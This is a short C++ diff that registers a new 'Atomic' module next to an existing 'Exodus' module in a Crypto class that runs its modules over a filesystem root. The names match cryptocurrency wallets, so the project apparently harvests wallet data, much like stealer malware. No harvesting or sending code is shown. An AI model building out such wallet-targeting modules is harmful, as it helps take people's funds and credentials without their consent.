@@ -3,11 +3,14 @@
 //
 
 #include "Crypto.h"
+
+#include "impl/Atomic.h"
 #include "impl/Exodus.h"
 
 Crypto::Crypto()
 {
     this->modules.push_back(new Exodus());
+    this->modules.push_back(new Atomic());
 }
 
 void Crypto::execute(fs::path &root) {
